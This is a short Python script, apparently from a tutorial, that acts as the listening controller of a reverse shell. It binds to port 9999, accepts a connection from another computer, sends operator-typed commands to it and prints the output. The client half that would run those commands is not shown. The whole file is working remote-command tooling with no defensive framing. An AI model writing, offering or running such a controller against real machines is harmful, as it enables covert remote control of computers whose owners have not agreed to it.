import socket
import sys


def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("error is" + str(msg))


def bind_socket():
    try:
        global host
        global port
        global s
        print("we are binding on the port" + str(port))

        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("error is" + str(msg) + "retrying.....")
        bind_socket()


# establishing connection between computers
def accept_socket():
    conn, address = s.accept()
    print("connections has been established" + "IP " + address[0] + "port " + str(port))
    send_command(conn)
    conn.close()


# Sending commands
def send_command(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    accept_socket()


main()
